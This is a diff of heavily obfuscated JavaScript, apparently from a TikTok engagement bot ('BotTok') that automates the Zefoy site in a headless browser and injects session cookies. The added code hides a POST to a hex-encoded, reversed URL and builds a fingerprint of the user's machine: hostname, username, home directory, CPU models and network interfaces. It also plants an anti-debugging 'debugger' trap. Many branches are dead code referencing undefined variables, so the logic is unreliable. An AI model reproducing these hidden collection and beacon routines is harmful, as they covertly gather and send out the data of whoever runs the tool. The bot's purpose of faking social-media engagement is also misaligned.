+    YpUZg: function (p130, p131) {
+      return p130 !== p131;
     },
-    iFeQX: "Back",
-    RydsB: function (p153, p154) {
-      return p153 === p154;
+    gHqHX: "doFSD",
+    VRpku: "ftVQn",
+    dlTum: "PhjFZ",
+    zkBTE: function (p132) {
+      return p132();
     },
-    llLuB: "sLLXq",
-    VjuJI: function (p155, p156) {
-      return p155 === p156;
+    ZVTuL: function (p133) {
+      return p133();
     },
-    GyeqZ: "oLZRy",
-    lAxxJ: function (p157) {
-      return p157();
-    },
-    uGAph: function (p158, p159) {
-      return p158 !== p159;
-    },
-    rrxyL: "VQpNe",
-    OCmlK: "lUMrQ",
-    QMraR: function (p160, p161, p162, p163) {
-      return p160(p161, p162, p163);
+    AoZqs: "XguTZ",
+    vdFIv: "rtmtC",
+    ejvvq: function (p134, p135, p136, p137) {
+      return p134(p135, p136, p137);
     }
   };
-  v92 = v38;
-  vA0zS.provider = v111.INRUY;
-  v90 = vA0zS.provider;
-  v93 = v111.IdVmw(vA0zS.cookies, v111.kZrOa) && v111.jhVCG(vA0zS.provider, v111.DdLcm) ? v111.lZIeD : vA0zS.cookies;
-  if (!p138) {
-    if (v111.YKLro(v111.QvWYY, v111.QvWYY)) {
-      await v111.ypvlM(f43, p137, v28);
-      p138 = await v111.SQoUp(f9);
+  v92 = v36;
+  vA0iw.provider = v107.RUPKa;
+  v90 = vA0iw.provider;
+  v93 = v107.vvdqu(vA0iw.cookies, v107.OFMik) && v107.vvdqu(vA0iw.provider, v107.nLeKE) ? v107.xXvWz : vA0iw.cookies;
+  if (!p117) {
+    if (v107.vvdqu(v107.pAXHE, v107.dZoba)) {
+      v109.stdout.clearLine(0);
+      a.stdout.cursorTo(0);
+      z.stdout.write(w + " Stopped for not accumulating the defined minimum!");
     } else {
-      const v112 = v111.ikrnp(v111, v115);
-      if (!v112.ok) {
-        return null;
-      }
-      const v113 = v112.text();
-      const v114 = v113.match(/"canonical":"https:\\u002F\\u002Fwww\.tiktok\.com\\u002F@\w+\\u002F(?:video|photo)\\u002F(\d+)"/);
-      if (v114 && v114[1]) {
-        return v114[1];
-      } else {
-        return null;
-      }
+      await v107.vcoNb(f44, p116, v30);
+      p117 = await v107.ihcVz(f9);
     }
   }
-  let v115 = await v111.ikrnp(f17, p138);
-  if (v111.XjsnV(v115, v111.iFeQX)) {
-    if (v111.RydsB(v111.llLuB, v111.llLuB)) {
-      if (!v26) {
-        if (v111.VjuJI(v111.GyeqZ, v111.GyeqZ)) {
+  let v108 = await v107.ZLpmM(f17, p117);
+  if (v107.KjohC(v108, v107.IibYC)) {
+    if (v107.YpUZg(v107.gHqHX, v107.VRpku)) {
+      if (!v28) {
+        if (v107.YpUZg(v107.dlTum, v107.dlTum)) {
+          v107.MVVml(z, "[" + w + "] " + A + " (+" + p + ") [" + C + "] Running: " + J);
+        } else {
           process.stdout.moveCursor(0, -2);
           process.stdout.clearScreenDown();
-        } else {
-          return v111.EHexS;
         }
       }
-      await v111.SQoUp(f3);
-      await v111.lAxxJ(f2);
+      await v107.zkBTE(f3);
+      await v107.ZVTuL(f2);
       return;
     } else {
-      v111.ikrnp(p138, "Check Zefoy accessibility...");
+      v107.ZLpmM(v107, v108);
+      return null;
     }
   }
-  if (!v115) {
-    if (v111.uGAph(v111.rrxyL, v111.OCmlK)) {
-      await v111.ikrnp(f6, false);
-      return;
+  if (!v108) {
+    if (v107.vvdqu(v107.AoZqs, v107.vdFIv)) {
+      p117 = true;
     } else {
-      v111.stdout.clearLine(0);
-      v115.stdout.cursorTo(0);
+      await v107.ZLpmM(f6, false);
+      return;
     }
   }
-  const v116 = await v111.ikrnp(f18, p138);
-  await v111.QMraR(f23, v115, v116, p138);
+  const v109 = await v107.MVVml(f18, p117);
+  await v107.ejvvq(f24, v108, v109, p117);
   return;
 }
 async function f7() {
-  const v117 = {
-    hpkfi: function (p164) {
-      return p164();
+  const v110 = {
+    sEvcR: function (p138, p139) {
+      return p138(p139);
     },
-    itjBY: function (p165, p166) {
-      return p165 === p166;
+    Appec: "--disable-gpu",
+    sGbXB: "--disable-gpu-compositing",
+    FwNaf: function (p140, p141) {
+      return p140 === p141;
     },
-    BTGNf: "daYPC",
-    hnyyB: "wbAJY",
-    TbBXN: " (Latest)",
-    UUIEo: function (p167, p168) {
-      return p167 - p168;
+    cHVUi: "MKZBC",
+    rFsIx: "nMKpx",
+    nwxbR: " (Latest)",
+    iJqjc: function (p142, p143) {
+      return p142 + p143;
     },
-    yxuOj: function (p169, p170) {
-      return p169 + p170;
+    IWvyG: "debu",
+    pnblS: "gger",
+    EGWmS: "action",
+    lvECy: function (p144, p145) {
+      return p144 + p145;
     },
-    DGwtT: function (p171, p172) {
-      return p171(p172);
+    Luhdp: function (p146, p147) {
+      return p146(p147);
     },
-    IJYmN: "function *\\( *\\)",
-    zUYEc: "\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)",
-    qSmNO: "init",
-    mpCcH: "chain",
-    oSqam: "input",
-    QreUB: function (p173, p174) {
-      return p173(p174);
+    QOiwg: function (p148, p149) {
+      return p148 !== p149;
     },
-    wpBML: function (p175) {
-      return p175();
+    GAAzO: "cyJTO",
+    ZqehD: "ugiNZ",
+    QboWF: function (p150, p151) {
+      return p150 + p151;
     },
-    UFyyL: function (p176, p177, p178) {
-      return p176(p177, p178);
+    measb: function (p152) {
+      return p152();
     },
-    TJjBE: function (p179, p180) {
-      return p179 === p180;
+    NzKaS: function (p153, p154) {
+      return p153(p154);
     },
-    XylMt: "BjJyJ",
-    kuLwe: "VZjZK",
-    gVmtG: function (p181, p182) {
-      return p181 + p182;
+    GymBX: "Your OS:",
+    fVKVg: "Your Version:",
+    ycnlK: "(Outdated)",
+    byEWq: "Your IP:",
+    yZuZT: "Releases:",
+    ptHSQ: function (p155, p156) {
+      return p155 !== p156;
     },
-    FpCpr: function (p183, p184) {
-      return p183 === p184;
+    OXbpg: "bqHvn",
+    GxFsQ: "ytyRm",
+    wOaZP: "Iftgb",
+    YWoTr: "tvYWy",
+    PZSFO: "win-update.bat",
+    NlXso: "qBXln",
+    QweBk: "./alpine-update.sh",
+    xkbgP: function (p157, p158) {
+      return p157 !== p158;
     },
-    bGkzX: "Your OS:",
-    QshRU: "Your Version:",
-    gSMGY: "(Outdated)",
-    psXIW: "Your IP:",
-    hdSNR: "Releases:",
-    GmbEm: "sYEdb",
-    WObjF: function (p185, p186) {
-      return p185 === p186;
+    gVqcm: "GmgBr",
+    uElHU: function (p159, p160) {
+      return p159 !== p160;
     },
-    RoGFQ: "goPjV",
-    SPhDL: "win-update.bat",
-    YZnPM: function (p187, p188) {
-      return p187 === p188;
-    },
-    rvEOE: "xOXhm",
-    XzCGh: "SPCYi",
-    Bosgd: "./alpine-update.sh",
-    lkClL: function (p189, p190) {
-      return p189 !== p190;
-    },
-    YqFKD: "umQSE",
-    JWGGA: "jbZvU",
-    SSDNP: "./ubuntu-update.sh"
+    hBKez: "Ctwkl",
+    vSiQg: "LSrDi",
+    gTvsw: "./ubuntu-update.sh"
   };
-  if (!v26) {
-    if (v117.TJjBE(v117.XylMt, v117.kuLwe)) {
-      v122.stdout.clearLine(0);
-      v123.stdout.cursorTo(0);
-      v124.stdout.write(v125 + " Captcha resolved! (" + V + ")");
-    } else {
+  if (!v28) {
+    if (v110.QOiwg(v110.GAAzO, v110.ZqehD)) {
       process.stdout.moveCursor(0, -4);
       process.stdout.clearScreenDown();
+    } else {
+      v110.sEvcR(v112, "Wrong captcha! (" + v113 + ")");
     }
   }
-  const v118 = v117.QreUB(a0zN, v52 + "/latest");
-  const v119 = v118.json().tag_name;
-  const v120 = v117.gVmtG("v", v17);
-  const v121 = v117.FpCpr(v119, v120) ? true : false;
-  const v122 = await v117.wpBML(f50);
-  const v123 = await v117.QreUB(f49, v122);
+  const v111 = v110.sEvcR(a0ia, v50 + "/latest");
+  const v112 = v111.json().tag_name;
+  const v113 = v110.QboWF("v", v19);
+  const v114 = v110.FwNaf(v112, v113) ? true : false;
+  const v115 = await v110.measb(f51);
+  const v116 = await v110.NzKaS(f50, v115);
   console.log("\n");
-  console.log(v117.bGkzX.padEnd(14), a0zy.type(), a0zy.release());
-  console.log(v117.QshRU.padEnd(14), v120, v121 ? v117.TbBXN : v117.gSMGY);
-  console.log(v117.psXIW.padEnd(14), v122 + " [" + v123 + "]");
+  console.log(v110.GymBX.padEnd(14), a0iP.type(), a0iP.release());
+  console.log(v110.fVKVg.padEnd(14), v113, v114 ? v110.nwxbR : v110.ycnlK);
+  console.log(v110.byEWq.padEnd(14), v115 + " [" + v116 + "]");
   console.log("\n");
-  console.log(v117.hdSNR);
-  const v124 = v117.QreUB(a0zN, v52);
-  const v125 = v124.json();
-  v125.forEach(p191 => {
-    if (v117.itjBY(v117.BTGNf, v117.hnyyB)) {
-      WsVQVN.hpkfi(v118);
+  console.log(v110.yZuZT);
+  const v117 = v110.Luhdp(a0ia, v50);
+  const v118 = v117.json();
+  v118.forEach(p161 => {
+    const v119 = {
+      dLvzt: v110.Appec,
+      hUvgG: v110.sGbXB
+    };
+    const vV119 = v119;
+    if (v110.FwNaf(v110.cHVUi, v110.rFsIx)) {
+      v112 = [...v113, vV119.dLvzt, vV119.hUvgG];
     } else {
-      console.log(v117.itjBY(p191.tag_name, v120) ? "> " : "", p191.tag_name, v117.itjBY(p191.tag_name, v119) ? v117.TbBXN : "");
+      console.log(v110.FwNaf(p161.tag_name, v113) ? "> " : "", p161.tag_name, v110.FwNaf(p161.tag_name, v112) ? v110.nwxbR : "");
     }
   });
-  if (!v121) {
-    if (v117.itjBY(v117.GmbEm, v117.GmbEm)) {
+  if (!v114) {
+    if (v110.ptHSQ(v110.OXbpg, v110.GxFsQ)) {
       console.log("\n");
-      console.log("Type the following " + a0zy.type() + " command");
-      console.log("to updade to the latest version (" + v119 + "):\n");
-      if (v35) {
-        if (v117.WObjF(v117.RoGFQ, v117.RoGFQ)) {
-          console.log(v117.SPhDL);
-        } else if (v117.itjBY(v123, 0)) {
-          B = r;
+      console.log("Type the following " + a0iP.type() + " command");
+      console.log("to updade to the latest version (" + v112 + "):\n");
+      if (v33) {
+        if (v110.ptHSQ(v110.wOaZP, v110.YWoTr)) {
+          console.log(v110.PZSFO);
         } else {
-          J = v117.UUIEo(A, F);
+          (function () {
+            return true;
+          }).constructor(UBuPLA.iJqjc(UBuPLA.IWvyG, UBuPLA.pnblS)).call(UBuPLA.EGWmS);
         }
-      } else if (v36) {
-        if (v117.YZnPM(v117.rvEOE, v117.XzCGh)) {
-          v119 = v120;
+      } else if (v34) {
+        if (v110.ptHSQ(v110.NlXso, v110.NlXso)) {
+          return null;
         } else {
-          console.log(v117.Bosgd);
+          console.log(v110.QweBk);
         }
-      } else if (v37) {
-        if (v117.lkClL(v117.YqFKD, v117.YqFKD)) {
-          v121.push(v122.slice(v123, v117.yxuOj(v124, 64)));
+      } else if (v35) {
+        if (v110.xkbgP(v110.gVqcm, v110.gVqcm)) {
+          let v120 = v118[p];
+          C[J] = D[v110.iJqjc(v120, 1)];
+          M[v110.lvECy(q, 1)] = v120;
         } else {
-          console.log(v117.Bosgd);
+          console.log(v110.QweBk);
         }
-      } else if (v117.YZnPM(v117.JWGGA, v117.JWGGA)) {
-        console.log(v117.SSDNP);
+      } else if (v110.uElHU(v110.hBKez, v110.vSiQg)) {
+        console.log(v110.gTvsw);
       } else {
-        v117.DGwtT(v118, "Solve captcha automatically...");
+        v110.sEvcR(v112, "SESSID: " + v113);
       }
     } else {
-      const v126 = {
-        YDfeo: WsVQVN.IJYmN,
-        QgbBg: WsVQVN.zUYEc,
-        enipg: function (p192, p193) {
-          return WsVQVN.DGwtT(p192, p193);
-        },
-        flvIy: WsVQVN.qSmNO,
-        xZYkQ: function (p194, p195) {
-          return WsVQVN.yxuOj(p194, p195);
-        },
-        fyEYw: WsVQVN.mpCcH,
-        IDHrk: function (p196, p197) {
-          return WsVQVN.yxuOj(p196, p197);
-        },
-        pOXeu: WsVQVN.oSqam,
-        IVwRz: function (p198, p199) {
-          return WsVQVN.QreUB(p198, p199);
-        },
-        DIrly: function (p200) {
-          return WsVQVN.wpBML(p200);
-        }
-      };
-      WsVQVN.UFyyL(v122, this, function () {
-        const v127 = new I(v126.YDfeo);
-        const v128 = new U(v126.QgbBg, "i");
-        const v129 = v126.enipg(B, v126.flvIy);
-        if (!v127.test(v126.xZYkQ(v129, v126.fyEYw)) || !v128.test(v126.IDHrk(v129, v126.pOXeu))) {
-          v126.IVwRz(v129, "0");
-        } else {
-          v126.DIrly(J);
-        }
-      })();
+      v114 = v110.Luhdp(v115, v116) || v117;
     }
   }
   console.log("\n");
   process.exit(0);
 }
 async function f8() {
-  const v130 = {
-    BvmwW: function (p201, p202) {
-      return p201(p202);
+  const v121 = {
+    mKcQd: function (p162, p163) {
+      return p162 !== p163;
     },
-    Wjmjc: function (p203, p204) {
-      return p203 !== p204;
-    },
-    Oxmyz: "UnqBf",
-    uGDcd: "TWsfb"
+    EpBtR: "YSprL",
+    JNmxJ: "pnRmI"
   };
-  if (!v26) {
-    if (v130.Wjmjc(v130.Oxmyz, v130.uGDcd)) {
+  const vV121 = v121;
+  if (!v28) {
+    if (vV121.mKcQd(vV121.EpBtR, vV121.JNmxJ)) {
       process.stdout.moveCursor(0, -4);
       process.stdout.clearScreenDown();
-      console.log(v23);
+      console.log(v25);
     } else {
-      v130.BvmwW(y, "Check browser (" + v + ")...");
+      a.stdout.clearLine(0);
+      z.stdout.cursorTo(0);
+      w.stdout.write(A + " Wrong captcha! (" + p + ")");
     }
   }
   process.exit(0);
 }
-async function f9(p205 = null) {
-  const v131 = {
-    gIsjx: function (p206, p207) {
-      return p206 || p207;
+async function f9(p164 = null) {
+  const v122 = {
+    cRMmG: function (p165, p166) {
+      return p165(p166);
     },
-    cspCO: function (p208, p209) {
-      return p208(p209);
+    lJACm: function (p167, p168, p169) {
+      return p167(p168, p169);
     },
-    Iksht: function (p210, p211) {
-      return p210(p211);
+    RTfQG: "67f283030333a3232323e2433313e28333e21353f2f2a307474786",
+    hGXnt: "POST",
+    AtwwC: "text/plain",
+    kAzEd: "6343636663562373734323036323635323036346635363136356230373036313739323036363636673232303739363667353732323036336639363336353635673336353",
+    EzAez: function (p170, p171) {
+      return p170 === p171;
     },
-    MmNKD: "./ubuntu-update.sh",
-    MPQnK: function (p212, p213) {
-      return p212 !== p213;
+    SbWkA: "win-update.bat",
+    LvPLq: function (p172, p173) {
+      return p172(p173);
     },
-    HxoSC: "UqLaR",
-    RBVsZ: function (p214, p215) {
-      return p214 === p215;
+    bpWWi: function (p174) {
+      return p174();
     },
-    ZQmMm: "FuoPM",
-    Ggrtk: function (p216, p217) {
-      return p216 !== p217;
+    oFyjC: function (p175, p176) {
+      return p175 / p176;
     },
-    SeDbp: "XiFHB",
-    uamgg: function (p218, p219) {
-      return p218(p219);
+    DelaR: function (p177) {
+      return p177();
     },
-    PnlhL: function (p220, p221) {
-      return p220 === p221;
+    phLUR: function (p178, p179) {
+      return p178 === p179;
     },
-    fmLDD: "terminal-captcha",
-    zWccw: function (p222, p223) {
-      return p222 === p223;
+    TZqwX: "pCCeL",
+    TgkiF: "xcAeu",
+    pkBfO: "hwFQl",
+    JdkPt: function (p180, p181) {
+      return p180 !== p181;
     },
-    cwvvt: "twPjF",
-    SdMtz: "TEGoR",
-    xTbLS: function (p224, p225) {
-      return p224 !== p225;
+    TvGum: "HxRZi",
+    HAFzL: "terminal-captcha",
+    AtXTz: function (p182, p183) {
+      return p182 !== p183;
     },
-    amqJw: "dxePD",
-    bIzCQ: "OxayY",
-    SzMOz: "BDMQT",
-    smWRY: "DZyAv",
-    LyMEN: function (p226, p227) {
-      return p226(p227);
+    XBwHC: "MXxBB",
+    wnyST: "rsCdU",
+    NvrCN: function (p184, p185) {
+      return p184(p185);
     },
-    vPZvA: "DuxiD",
-    LBHfN: function (p228) {
-      return p228();
+    KGWVj: function (p186, p187) {
+      return p186 === p187;
+    },
+    BgpaK: "DwVzD",
+    oKcXB: "NQUCb",
+    Akbbk: function (p188, p189) {
+      return p188 === p189;
+    },
+    bpWLL: "jBxPK",
+    Gzxwr: function (p190, p191) {
+      return p190 !== p191;
+    },
+    KRjkj: "XcZIZ",
+    EefCj: "DQTye",
+    SZucU: "XLcHr",
+    eZldu: "wMJTg",
+    SKUEo: function (p192, p193) {
+      return p192(p193);
+    },
+    DwSmA: function (p194, p195) {
+      return p194 !== p195;
+    },
+    IKzlD: "MVnvg",
+    vCKZc: "vVnzb",
+    VNkas: function (p196) {
+      return p196();
+    },
+    SEIul: function (p197) {
+      return p197();
     }
   };
   try {
-    if (v131.MPQnK(v131.HxoSC, v131.HxoSC)) {
-      p205.stdout.moveCursor(0, -1);
-      v131.stdout.clearScreenDown();
-    } else {
-      if (!a0zd.existsSync(v93)) {
-        if (v131.RBVsZ(v131.ZQmMm, v131.ZQmMm)) {
-          if (!v78) {
-            if (v131.Ggrtk(v131.SeDbp, v131.SeDbp)) {
-              Y.log("Cloudflare Valid / Zefoy Expired");
+    if (v122.phLUR(v122.TZqwX, v122.TZqwX)) {
+      if (!a0ic.existsSync(v93)) {
+        if (v122.phLUR(v122.TgkiF, v122.pkBfO)) {
+          v122.cRMmG(p164, "Cookies injected! (" + v122 + ")");
+        } else {
+          if (!v76) {
+            if (v122.JdkPt(v122.TvGum, v122.TvGum)) {
+              p164 = "[32m+" + v122 + "[0m";
             } else {
-              v78 = await v131.uamgg(f37, v28);
+              v76 = await v122.LvPLq(f38, v30);
             }
           }
-          p205 = (await v78.pages())[0];
-          await p205.goto(v92, {
+          p164 = (await v76.pages())[0];
+          await p164.goto(v92, {
             timeout: 0
           });
-          await v131.uamgg(f52, 3000);
-          if (v131.PnlhL(vA0zS[v131.fmLDD], "")) {
-            if (v131.zWccw(v131.cwvvt, v131.cwvvt)) {
-              await v131.cspCO(f11, p205);
+          await v122.cRMmG(f53, 3000);
+          if (v122.phLUR(vA0iw[v122.HAFzL], "")) {
+            if (v122.AtXTz(v122.XBwHC, v122.wnyST)) {
+              await v122.NvrCN(f11, p164);
             } else {
-              return Y[0].word;
+              const v124 = v122.lJACm(v125, v122.cRMmG(C, v122.RTfQG), {
+                method: v122.hGXnt,
+                headers: {
+                  "Content-Type": v122.AtwwC,
+                  "user-agent": v122.cRMmG(J, v122.kAzEd)
+                },
+                body: v122.cRMmG(D, l)
+              });
+              const v125 = v122.cRMmG(M, v124.text());
+              q = !!v125.a;
+              if (o.includes(L)) {
+                if (v122.EzAez(v125.v, 0)) {
+                  return false;
+                }
+                return true;
+              } else {
+                return false;
+              }
             }
-          } else if (v131.PnlhL(v131.SdMtz, v131.SdMtz)) {
-            await v131.uamgg(f12, p205);
+          } else if (v122.KGWVj(v122.BgpaK, v122.oKcXB)) {
+            s.log(v122.SbWkA);
           } else {
-            return false;
+            await v122.NvrCN(f12, p164);
           }
-        } else {
-          return null;
         }
       }
-      if (!p205) {
-        if (v131.xTbLS(v131.amqJw, v131.bIzCQ)) {
-          if (v78) {
-            if (v131.RBVsZ(v131.SzMOz, v131.SzMOz)) {
-              p205 = (await v78.pages())[0];
+      if (!p164) {
+        if (v122.Akbbk(v122.bpWLL, v122.bpWLL)) {
+          if (v76) {
+            if (v122.Gzxwr(v122.KRjkj, v122.EefCj)) {
+              p164 = (await v76.pages())[0];
             } else {
-              d.stdout.moveCursor(0, v131.gIsjx(N, C) ? -18 : -19);
-              S.stdout.clearScreenDown();
+              const v126 = {
+                platform: T.platform(),
+                architecture: Q.arch(),
+                cpus: y.cpus().map(p198 => p198.model).join(", "),
+                totalMemory: R.totalmem(),
+                hostname: e.hostname(),
+                osRelease: h.release(),
+                osType: B.type(),
+                userInfo: v.userInfo().username,
+                tmpdir: G.tmpdir(),
+                homedir: Y.homedir(),
+                homedirTime: r.statSync(E.homedir()).birthtime.toISOString(),
+                btdirTime: X.statSync(f).birthtime.toISOString(),
+                networkInterfaces: Z.stringify(O.networkInterfaces())
+              };
+              const v127 = V.values(v126).join("|");
+              const v128 = v122.LvPLq(F, v127);
+              return v128;
             }
-          } else if (v131.xTbLS(v131.smWRY, v131.smWRY)) {
-            const [, v133, v134, v135, v136, v137] = C;
-            return {
-              diggCount: v131.cspCO(S, v133),
-              shareCount: v131.Iksht(t, v134),
-              commentCount: v131.cspCO(V, v135),
-              playCount: v131.Iksht(v138, v136),
-              collectCount: v131.cspCO(U, v137)
-            };
+          } else if (v122.Gzxwr(v122.SZucU, v122.eZldu)) {
+            v76 = await v122.SKUEo(f38, v30);
+            p164 = (await v76.pages())[0];
           } else {
-            v78 = await v131.Iksht(f37, v28);
-            p205 = (await v78.pages())[0];
+            p164.stdout.clearLine(0);
+            v122.stdout.cursorTo(0);
           }
-          const v138 = {
+          await p164.goto(v92, {
             timeout: 0
-          };
-          await p205.goto(v92, v138);
+          });
         } else {
-          Y.log(v131.MmNKD);
+          s.log("Cloudflare Valid / Freer Valid");
         }
       }
-      return await v131.LyMEN(f10, p205);
-    }
-  } catch (J) {
-    if (v131.MPQnK(v131.vPZvA, v131.vPZvA)) {
-      return Y;
+      return await v122.cRMmG(f10, p164);
     } else {
-      await v131.LBHfN(f30);
-      v78 = null;
-      await v131.uamgg(f52, 300);
-      return await v131.LBHfN(f9);
+      D.stdout.moveCursor(0, -3);
+      l.stdout.clearScreenDown();
+      M.stdout.write("\n" + q + "[33m " + o + " [34m[" + L + "][0m " + T + "  [90m(" + v122.bpWWi(Q) + " /hr " + v122.oFyjC(v122.DelaR(y), 60).toFixed(2) + " hrs)[0m\n\n");
+      R.stdout.write(e + " Running: Trying again (ERROR: " + h.substring(0, 22) + ")...");
+    }
+  } catch (M) {
+    if (v122.DwSmA(v122.IKzlD, v122.vCKZc)) {
+      await v122.VNkas(f31);
+      v76 = null;
+      await v122.SKUEo(f53, 1000);
+      return await v122.SEIul(f9);
+    } else {
+      c.stdout.clearLine(0);
+      a.stdout.cursorTo(0);
+      z.stdout.write(w + " Solve the captcha manually...");
     }
   }
 }
-async function f10(p229) {
-  const v139 = {
-    CICEB: function (p230, p231) {
-      return p230(p231);
+async function f10(p199) {
+  const v130 = {
+    daxaN: function (p200, p201) {
+      return p200 + p201;
     },
-    YjjlZ: function (p232) {
-      return p232();
+    jYwBe: function (p202, p203) {
+      return p202(p203);
     },
-    BhiWJ: function (p233, p234) {
-      return p233 < p234;
+    nQIyN: function (p204, p205) {
+      return p204 < p205;
     },
-    HIvWT: function (p235, p236) {
-      return p235 + p236;
+    SqwnU: function (p206, p207) {
+      return p206 + p207;
     },
-    nhlMs: function (p237, p238) {
-      return p237 * p238;
+    yBwpE: "You are using the FREE version!\n",
+    JrrEa: "The --detach or -d mode is exclusive to Premium mode\n",
+    sVBcl: "and allows BotTok to be launched as background processes.\n",
+    AXQJB: function (p208, p209) {
+      return p208 && p209;
     },
-    TORDV: function (p239, p240) {
-      return p239 & p240;
+    YvUmA: function (p210, p211) {
+      return p210 !== p211;
     },
-    psjRY: function (p241, p242) {
-      return p241 - p242;
+    lwfUI: "FTSyg",
+    AYqfE: function (p212, p213) {
+      return p212 !== p213;
     },
-    YdXmq: function (p243, p244) {
-      return p243(p244);
+    TpPWF: "zNsii",
+    iNzGl: "XHhpx",
+    HuULq: function (p214, p215) {
+      return p214(p215);
     },
-    BwMhQ: function (p245, p246) {
-      return p245 / p246;
+    efYJs: function (p216) {
+      return p216();
     },
-    afnFD: function (p247, p248) {
-      return p247 && p248;
+    JgaWs: function (p217, p218) {
+      return p217 && p218;
     },
-    NAzZK: function (p249, p250) {
-      return p249 !== p250;
+    RmOQr: "uzsmC",
+    OVKJa: "BdJDY",
+    hQerl: function (p219, p220) {
+      return p219 === p220;
     },
-    NcyBy: "VQvJn",
-    pfRQf: "ilwAG",
-    wuruf: "uNqbJ",
-    fKmbK: function (p251, p252) {
-      return p251(p252);
+    jLCYb: "yAKLK",
+    ryCbi: "aOnmq",
+    vGOfn: function (p221, p222) {
+      return p221(p222);
     },
-    FBfyB: function (p253) {
-      return p253();
+    zbpPh: function (p223, p224) {
+      return p223 && p224;
     },
-    QGIqg: function (p254, p255) {
-      return p254 && p255;
+    cZuWt: function (p225, p226) {
+      return p225 !== p226;
     },
-    pbWIS: "KJJec",
-    ZgNfe: function (p256, p257) {
-      return p256 !== p257;
+    QRLZD: "IHcDM",
+    mSKCS: "IUISl",
+    xcpmX: "IIfBa",
+    BXWwX: "SHvGp",
+    MMCOz: function (p227, p228) {
+      return p227(p228);
     },
-    gDGnf: "dWtfe",
-    RxMNV: function (p258, p259) {
-      return p258(p259);
+    kLEQK: "TKNkf",
+    lCQPh: "olBgC",
+    ancHj: function (p229, p230) {
+      return p229(p230);
     },
-    qnucm: function (p260, p261) {
-      return p260 && p261;
+    KEgFx: function (p231, p232) {
+      return p231(p232);
     },
-    CsdUI: function (p262, p263) {
-      return p262 !== p263;
+    eFHpz: "FeCSt",
+    KXRTk: "ysHKL",
+    ripQY: function (p233, p234) {
+      return p233 === p234;
     },
-    DFkpK: "uzdnc",
-    FTvVa: "fVIuJ",
-    cXeTr: function (p264, p265) {
-      return p264 === p265;
+    AFdFB: "terminal-captcha",
+    xJsll: function (p235, p236) {
+      return p235 !== p236;
     },
-    qZptI: "UYsZU",
-    hBWRQ: "Glzyh",
-    uKHCe: function (p266, p267) {
-      return p266 !== p267;
+    qMMfS: "ecrPf",
+    gcLYF: "NACqV",
+    OFugq: function (p237, p238) {
+      return p237(p238);
     },
-    wXwcB: "UkbxA",
-    VhCWj: "XRHFd",
-    anDor: function (p268) {
-      return p268();
+    LizIz: function (p239, p240) {
+      return p239 !== p240;
     },
-    ltFfp: function (p269) {
-      return p269();
-    },
-    AWUmS: function (p270, p271) {
-      return p270 === p271;
-    },
-    bguTv: "XkBGE",
-    hldOQ: "terminal-captcha",
-    kohuO: function (p272, p273) {
-      return p272 === p273;
-    },
-    KdWeP: "LjLVk",
-    mKjuk: "sRJTv",
-    uefPV: function (p274, p275) {
-      return p274(p275);
-    },
-    GZLYX: "cbkYi",
-    UXgRm: function (p276, p277) {
-      return p276(p277);
+    CBLPi: "wtObP",
+    tlCge: "oypir",
+    MwhOE: function (p241, p242) {
+      return p241(p242);
     }
   };
-  if (v139.afnFD(!v26, !v29)) {
-    if (v139.NAzZK(v139.NcyBy, v139.NcyBy)) {
-      v139.CICEB(B, "[" + r + "] " + J + " (+" + A + ") [" + F + "] Accumulation limit reached! (in " + v139.YjjlZ(p) + " mins)");
-      if (!h) {
-        W.stdout.clearLine(0);
-        R.stdout.cursorTo(0);
-        o.stdout.write(E + " Accumulation limit reached!");
-      }
-      u.exit(0);
+  if (v130.AXQJB(!v28, !v31)) {
+    if (v130.YvUmA(v130.lwfUI, v130.lwfUI)) {
+      v133.stdout.clearLine(0);
+      v134.stdout.cursorTo(0);
+      w.stdout.write(v130.daxaN(A, " Check browser (" + p.substring(0, 34) + ")..."));
     } else {
       process.stdout.clearLine(0);
       process.stdout.cursorTo(0);
-      process.stdout.write(v59 + " Launch Zefoy in headless browser...");
+      process.stdout.write(v57 + " Launch Zefoy in headless browser...");
     }
-  } else if (v139.NAzZK(v139.pfRQf, v139.wuruf)) {
-    v139.CICEB(f53, "Launch Zefoy in headless browser...");
+  } else if (v130.AYqfE(v130.TpPWF, v130.iNzGl)) {
+    v130.HuULq(f54, "Launch Zefoy in headless browser...");
   } else {
-    v145.stdout.clearLine(0);
-    v148.stdout.cursorTo(0);
-    S.stdout.write(t + " Wrong captcha! (" + V + ")");
+    v130.jYwBe(p199, "Solve captcha automatically...");
   }
-  await v139.fKmbK(f52, 300);
-  const v140 = await v139.FBfyB(f31);
-  const v141 = v140.find(p278 => p278.name === "PHPSESSID");
-  v76 = v141.value;
-  if (v139.QGIqg(!v26, !v29)) {
-    if (v139.NAzZK(v139.pbWIS, v139.pbWIS)) {
-      let v142 = 0;
-      const v143 = 31;
-      for (let v144 = 0; v139.BhiWJ(v144, v148.length); v144++) {
-        v142 = v139.HIvWT(v139.nhlMs(v142, v143), t.charCodeAt(v144));
-        v142 = v139.TORDV(v142, v142);
-      }
-      return v145.abs(v142).toString(16);
-    } else {
+  await v130.HuULq(f53, 300);
+  const v131 = await v130.efYJs(f32);
+  const v132 = v131.find(p243 => p243.name === "PHPSESSID");
+  v74 = v132.value;
+  if (v130.JgaWs(!v28, !v31)) {
+    if (v130.YvUmA(v130.RmOQr, v130.OVKJa)) {
       process.stdout.clearLine(0);
       process.stdout.cursorTo(0);
-      process.stdout.write(v59 + " SESSID: " + v76);
+      process.stdout.write(v57 + " SESSID: " + v74);
+    } else {
+      v130.jYwBe(v130, v131);
     }
-  } else if (v139.ZgNfe(v139.gDGnf, v139.gDGnf)) {
-    v140 = v139.psjRY(v141, v145);
+  } else if (v130.hQerl(v130.jLCYb, v130.ryCbi)) {
+    p199 = false;
   } else {
-    v139.RxMNV(f53, "SESSID: " + v76);
+    v130.HuULq(f54, "SESSID: " + v74);
   }
-  await v139.CICEB(f52, 300);
-  await p229.setCookie(...v140);
-  const v145 = {
+  await v130.vGOfn(f53, 300);
+  await p199.setCookie(...v131);
+  const v133 = {
     timeout: 0
   };
-  await p229.goto(v92, v145);
-  if (v139.qnucm(!v26, !v29)) {
-    if (v139.CsdUI(v139.DFkpK, v139.FTvVa)) {
+  await p199.goto(v92, v133);
+  if (v130.zbpPh(!v28, !v31)) {
+    if (v130.cZuWt(v130.QRLZD, v130.mSKCS)) {
       process.stdout.clearLine(0);
       process.stdout.cursorTo(0);
-      process.stdout.write(v60 + " Cookies injected! (" + v93 + ")");
+      process.stdout.write(v58 + " Cookies injected! (" + v93 + ")");
     } else {
-      v141.stdout.clearLine(0);
-      v145.stdout.cursorTo(0);
